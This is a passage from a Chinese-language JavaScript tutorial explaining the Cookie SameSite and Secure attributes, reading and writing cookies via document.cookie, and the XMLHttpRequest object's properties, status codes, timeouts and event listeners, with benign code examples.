<p>Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p>
<p>下面的设置无效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None</span><br></pre></td></tr></table></figure>

<p>下面的设置有效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None; Secure</span><br></pre></td></tr></table></figure>

<h3 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h3><p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;foo&#x3D;bar;baz&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var cookies &#x3D; document.cookie.split(&#39;;&#39;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">  console.log(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; foo&#x3D;bar</span><br><span class="line">&#x2F;&#x2F; baz&#x3D;bar</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14&#39;;</span><br></pre></td></tr></table></figure>

<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;test1&#x3D;hello&#39;;</span><br><span class="line">document.cookie &#x3D; &#39;test2&#x3D;world&#39;;</span><br><span class="line">document.cookie</span><br><span class="line">&#x2F;&#x2F; test1&#x3D;hello;test2&#x3D;world</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;foo&#x3D;bar; expires&#x3D;Fri, 31 Dec 2020 23:59:59 GMT&quot;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
<p>各个属性的写入注意点如下。</p>
<ul>
<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
<li><code>max-age</code>属性的值为秒数。</li>
<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
</ul>
<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14; &#39;</span><br><span class="line">  + &#39;expires&#x3D;&#39; + someDate.toGMTString() + &#39;; &#39;</span><br><span class="line">  + &#39;path&#x3D;&#x2F;subdirectory; &#39;</span><br><span class="line">  + &#39;domain&#x3D;*.example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;;expires&#x3D;Thu, 01-Jan-1970 00:00:01 GMT&#39;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
<h2 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。</p>
<p>1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。</p>
<p>具体来说，AJAX 包括以下几个步骤。</p>
<ol>
<li>创建 XMLHttpRequest 实例</li>
<li>发出 HTTP 请求</li>
<li>接收服务器传回的数据</li>
<li>更新网页数据</li>
</ol>
<p>概括起来，就是一句话，AJAX 通过原生的<code>XMLHttpRequest</code>对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。</p>
<p><code>XMLHttpRequest</code>对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有<code>XML</code>和<code>Http</code>，它实际上可以使用多种协议（比如<code>file</code>或<code>ftp</code>），发送任何格式的数据（包括字符串和二进制）。</p>
<p><code>XMLHttpRequest</code>本身是一个构造函数，可以使用<code>new</code>命令生成实例。它没有任何参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br></pre></td></tr></table></figure>

<p>一旦新建实例，就可以使用<code>open()</code>方法指定建立 HTTP 连接的一些细节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#x2F;page.php&#39;, true);</span><br></pre></td></tr></table></figure>

<p>上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数<code>true</code>，表示请求是异步的。</p>
<p>然后，指定回调函数，监听通信状态（<code>readyState</code>属性）的变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange &#x3D; handleStateChange;</span><br><span class="line"></span><br><span class="line">function handleStateChange() &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦<code>XMLHttpRequest</code>实例的状态发生变化，就会调用监听函数<code>handleStateChange</code></p>
<p>最后使用<code>send()</code>方法，实际发出请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>send()</code>的参数为<code>null</code>，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。</p>
<p>一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。</p>
<p>注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。</p>
<p>下面是<code>XMLHttpRequest</code>对象简单用法的完整例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function()&#123;</span><br><span class="line">  &#x2F;&#x2F; 通信成功时，状态值为4</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4)&#123;</span><br><span class="line">    if (xhr.status &#x3D;&#x3D;&#x3D; 200)&#123;</span><br><span class="line">      console.log(xhr.responseText);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onerror &#x3D; function (e) &#123;</span><br><span class="line">  console.error(xhr.statusText);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;endpoint&#39;, true);</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h3 id="XMLHttpRequest-的实例属性"><a href="#XMLHttpRequest-的实例属性" class="headerlink" title="XMLHttpRequest 的实例属性"></a>XMLHttpRequest 的实例属性</h3><h4 id="XMLHttpRequest-readyState"><a href="#XMLHttpRequest-readyState" class="headerlink" title="XMLHttpRequest.readyState"></a>XMLHttpRequest.readyState</h4><p><code>XMLHttpRequest.readyState</code>返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。</p>
<ul>
<li>0，表示 XMLHttpRequest 实例已经生成，但是实例的<code>open()</code>方法还没有被调用。</li>
<li>1，表示<code>open()</code>方法已经调用，但是实例的<code>send()</code>方法还没有调用，仍然可以使用实例的<code>setRequestHeader()</code>方法，设定 HTTP 请求的头信息。</li>
<li>2，表示实例的<code>send()</code>方法已经调用，并且服务器返回的头信息和状态码已经收到。</li>
<li>3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的<code>responseType</code>属性等于<code>text</code>或者空字符串，<code>responseText</code>属性就会包含已经收到的部分信息。</li>
<li>4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。</li>
</ul>
<p>通信过程中，每当实例对象发生状态变化，它的<code>readyState</code>属性的值就会改变。这个值每一次变化，都会触发<code>readyStateChange</code>事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">  &#x2F;&#x2F; 请求结束，处理服务器返回的数据</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; 显示提示“加载中……”</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>xhr.readyState</code>等于<code>4</code>时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。</p>
<h4 id="XMLHttpRequest-onreadystatechange"><a href="#XMLHttpRequest-onreadystatechange" class="headerlink" title="XMLHttpRequest.onreadystatechange"></a>XMLHttpRequest.onreadystatechange</h4><p><code>XMLHttpRequest.onreadystatechange</code>属性指向一个监听函数。<code>readystatechange</code>事件发生时（实例的<code>readyState</code>属性变化），就会执行这个属性。</p>
<p>另外，如果使用实例的<code>abort()</code>方法，终止 XMLHttpRequest 请求，也会造成<code>readyState</code>属性变化，导致调用<code>XMLHttpRequest.onreadystatechange</code>属性。</p>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open( &#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#39; , true );</span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState !&#x3D;&#x3D; 4 || xhr.status !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(xhr.responseText);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-response"><a href="#XMLHttpRequest-response" class="headerlink" title="XMLHttpRequest.response"></a>XMLHttpRequest.response</h4><p><code>XMLHttpRequest.response</code>属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由<code>XMLHttpRequest.responseType</code>属性决定。该属性只读。</p>
<p>如果本次请求没有成功或者数据不完整，该属性等于<code>null</code>。但是，如果<code>responseType</code>属性等于<code>text</code>或空字符串，在请求没有结束之前（<code>readyState</code>等于3的阶段），<code>response</code>属性包含服务器已经返回的部分数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    handler(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseType"><a href="#XMLHttpRequest-responseType" class="headerlink" title="XMLHttpRequest.responseType"></a>XMLHttpRequest.responseType</h4><p><code>XMLHttpRequest.responseType</code>属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用<code>open()</code>方法之后、调用<code>send()</code>方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果<code>responseType</code>设为空字符串，就等同于默认值<code>text</code>。</p>
<p><code>XMLHttpRequest.responseType</code>属性可以等于以下值。</p>
<ul>
<li>“”（空字符串）：等同于<code>text</code>，表示服务器返回文本数据。</li>
<li>“arraybuffer”：ArrayBuffer 对象，表示服务器返回二进制数组。</li>
<li>“blob”：Blob 对象，表示服务器返回二进制对象。</li>
<li>“document”：Document 对象，表示服务器返回一个文档对象。</li>
<li>“json”：JSON 对象。</li>
<li>“text”：字符串。</li>
</ul>
<p>上面几种类型之中，<code>text</code>类型适合大多数情况，而且直接处理文本也比较方便。<code>document</code>类型适合返回 HTML &#x2F; XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。<code>blob</code>类型适合读取二进制数据，比如图片文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;path&#x2F;to&#x2F;image.png&#39;, true);</span><br><span class="line">xhr.responseType &#x3D; &#39;blob&#39;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  if (this.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    var blob &#x3D; new Blob([xhr.response], &#123;type: &#39;image&#x2F;png&#39;&#125;);</span><br><span class="line">    &#x2F;&#x2F; 或者</span><br><span class="line">    var blob &#x3D; xhr.response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>如果将这个属性设为<code>ArrayBuffer</code>，就可以按照数组的方式处理二进制数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;path&#x2F;to&#x2F;image.png&#39;, true);</span><br><span class="line">xhr.responseType &#x3D; &#39;arraybuffer&#39;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  var uInt8Array &#x3D; new Uint8Array(this.response);</span><br><span class="line">  for (var i &#x3D; 0, len &#x3D; uInt8Array.length; i &lt; len; ++i) &#123;</span><br><span class="line">    &#x2F;&#x2F; var byte &#x3D; uInt8Array[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>如果将这个属性设为<code>json</code>，浏览器就会自动对返回数据调用<code>JSON.parse()</code>方法。也就是说，从<code>xhr.response</code>属性（注意，不是<code>xhr.responseText</code>属性）得到的不是文本，而是一个 JSON 对象。</p>
<h4 id="XMLHttpRequest-responseText"><a href="#XMLHttpRequest-responseText" class="headerlink" title="XMLHttpRequest.responseText"></a>XMLHttpRequest.responseText</h4><p><code>XMLHttpRequest.responseText</code>属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.responseType &#x3D; &#39;text&#39;;</span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(xhr.responseText);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseXML"><a href="#XMLHttpRequest-responseXML" class="headerlink" title="XMLHttpRequest.responseXML"></a>XMLHttpRequest.responseXML</h4><p><code>XMLHttpRequest.responseXML</code>属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于<code>null</code>。</p>
<p>该属性生效的前提是 HTTP 回应的<code>Content-Type</code>头信息等于<code>text/xml</code>或<code>application/xml</code>。这要求在发送请求前，<code>XMLHttpRequest.responseType</code>属性要设为<code>document</code>。如果 HTTP 回应的<code>Content-Type</code>头信息不等于<code>text/xml</code>和<code>application/xml</code>，但是想从<code>responseXML</code>拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用<code>XMLHttpRequest.overrideMimeType()</code>方法，强制进行 XML 解析。</p>
<p>该属性得到的数据，是直接解析后的文档 DOM 树。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.responseType &#x3D; &#39;document&#39;;</span><br><span class="line">xhr.overrideMimeType(&#39;text&#x2F;xml&#39;);</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(xhr.responseXML);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-responseURL"><a href="#XMLHttpRequest-responseURL" class="headerlink" title="XMLHttpRequest.responseURL"></a>XMLHttpRequest.responseURL</h4><p><code>XMLHttpRequest.responseURL</code>属性是字符串，表示发送数据的服务器的网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;test&#39;, true);</span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  &#x2F;&#x2F; 返回 http:&#x2F;&#x2F;example.com&#x2F;test</span><br><span class="line">  console.log(xhr.responseURL);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>注意，这个属性的值与<code>open()</code>方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。</p>
<h4 id="XMLHttpRequest-status，XMLHttpRequest-statusText"><a href="#XMLHttpRequest-status，XMLHttpRequest-statusText" class="headerlink" title="XMLHttpRequest.status，XMLHttpRequest.statusText"></a>XMLHttpRequest.status，XMLHttpRequest.statusText</h4><p><code>XMLHttpRequest.status</code>属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为<code>0</code>。该属性只读。</p>
<ul>
<li>200, OK，访问正常</li>
<li>301, Moved Permanently，永久移动</li>
<li>302, Moved temporarily，暂时移动</li>
<li>304, Not Modified，未修改</li>
<li>307, Temporary Redirect，暂时重定向</li>
<li>401, Unauthorized，未授权</li>
<li>403, Forbidden，禁止访问</li>
<li>404, Not Found，未发现指定网址</li>
<li>500, Internal Server Error，服务器发生错误</li>
</ul>
<p>基本上，只有2xx和304的状态码，表示服务器返回是正常状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">  if ( (xhr.status &gt;&#x3D; 200 &amp;&amp; xhr.status &lt; 300)</span><br><span class="line">    || (xhr.status &#x3D;&#x3D;&#x3D; 304) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; 处理服务器的返回数据</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; 出错</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XMLHttpRequest.statusText</code>属性返回一个字符串，表示服务器发送的状态提示。不同于<code>status</code>属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用<code>open()</code>方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。</p>
<h4 id="XMLHttpRequest-timeout，XMLHttpRequestEventTarget-ontimeout"><a href="#XMLHttpRequest-timeout，XMLHttpRequestEventTarget-ontimeout" class="headerlink" title="XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout"></a>XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout</h4><p><code>XMLHttpRequest.timeout</code>属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。</p>
<p><code>XMLHttpRequestEventTarget.ontimeout</code>属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">var url &#x3D; &#39;&#x2F;server&#39;;</span><br><span class="line"></span><br><span class="line">xhr.ontimeout &#x3D; function () &#123;</span><br><span class="line">  console.error(&#39;The request for &#39; + url + &#39; timed out.&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function() &#123;</span><br><span class="line">  if (xhr.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    if (xhr.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class="line">      &#x2F;&#x2F; 处理服务器返回的数据</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.error(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;GET&#39;, url, true);</span><br><span class="line">&#x2F;&#x2F; 指定 10 秒钟超时</span><br><span class="line">xhr.timeout &#x3D; 10 * 1000;</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<h4 id="事件监听属性"><a href="#事件监听属性" class="headerlink" title="事件监听属性"></a>事件监听属性</h4><p>XMLHttpRequest 对象可以对以下事件指定监听函数。</p>
<ul>
<li>XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数</li>
<li>XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数</li>
<li>XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了<code>abort()</code>方法）的监听函数</li>
<li>XMLHttpRequest.onerror：error 事件（请求失败）的监听函数</li>
<li>XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数</li>
<li>XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数</li>
<li>XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数</li>
</ul>
<p>下面是一个例子。</p>
